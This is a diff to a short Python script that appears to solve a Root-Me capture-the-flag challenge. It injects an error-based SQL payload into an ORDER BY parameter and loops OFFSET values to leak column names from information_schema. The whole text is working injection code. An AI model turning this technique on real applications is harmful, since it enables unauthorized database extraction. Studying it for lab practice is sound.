@@ -4,7 +4,7 @@ import sys
 URL = "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC"
 
 for i in range(0,1000):
-	query ='ASC, (select 1 where 1=CAST((select column_name from information_schema.columns limit 1 offset ' + str(i) + ') as int))--'
+	query ='ASC, (CAST((select column_name from information_schema.columns limit 1 offset ' + str(i) + ') as int))--'
 	PARAMS ={'action':'contents','order':query}
 	http  = requests.get(url = URL,params = PARAMS)
 	content = http.content
